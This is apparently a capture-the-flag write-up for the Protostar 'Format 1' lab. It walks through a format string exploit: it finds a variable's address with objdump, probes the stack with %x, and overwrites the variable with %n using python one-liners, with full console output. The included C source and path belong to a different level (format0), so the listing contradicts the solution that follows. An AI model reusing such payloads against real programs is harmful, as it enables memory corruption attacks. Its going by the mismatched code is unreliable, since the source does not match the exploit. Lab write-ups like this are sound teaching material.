# Format 1

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

Hints:
- This level should be done in less than 10 bytes of input.
- "Exploiting format string vulnerabilities"

This level is at `/opt/protostar/bin/format0`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Solution

With `objdump -t` we can display all the symbols of the binary and find the address of the `target` global variable:

```console
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
```

Let's try to see the arguments on the stack. I tried an iterative way by incrementing the number of `'%x'` I want to display. 
Turns out that the **136**th is the one I was looking for: 

```console
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print('AAAA' + '%x ' * 136)"`" | tr ' ' '\n'
...
2f2e0000
6d726f66
317461
41414141
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print("AAAA" + "%136$08x")'`"; echo
AAAA41414141
```

Indeed, if I overwrite the **136**th element on the stack with the address of the `target` variable and the `'%n'` parameter, I complete the challenge:

```console
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print('\x38\x96\x04\x08' + '%x ' * 135 + '%n ')"`"
8804960c bffff558 8048469 b7fd8304 b7fd7ff4 bffff558 8048435 bffff740 b7ff1040 804845b b7fd7ff4 8048450 0 bffff5d8 b7eadc76 2 bffff604 bffff610 b7fe1848 bffff5c0 ffffffff b7ffeff4 804824d 1 bffff5c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff5d8 ea6d205f c03f964f 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff604 8048450 8048440 b7ff1040 bffff5fc b7fff8f8 2 bffff736 bffff740 0 bffff8dd bffff8f2 bffff909 bffff921 bffff92f bffff943 bffff964 bffff97b bffff98e bffff998 bffffe88 bffffea1 bffffedf bffffef3 bfffff11 bfffff28 bfffff39 bfffff54 bfffff5c bfffff6c bfffff79 bfffffac bfffffc0 bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 1f8bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff71b 1f bffffff2 f bffff72b 0 0 26000000 f098cfd6 37900ac3 b198457e 6925739a 363836 0 2f2e0000 6d726f66 317461  you have modified the target :)
```

We can do it this way also:

```console
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print("\x38\x96\x04\x08" + "%136$08n")'`"; echo
8you have modified the target :)
```

## Useful links

- <https://cs155.stanford.edu/papers/formatstring-1.2.pdf>
- [LiveOverflow: A simple Format String exploit example - bin 0x11](https://youtu.be/0WvrSfcdq1I?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- <https://www.lse.epita.fr/teaching/epita/hts/workshop-secu.pdf>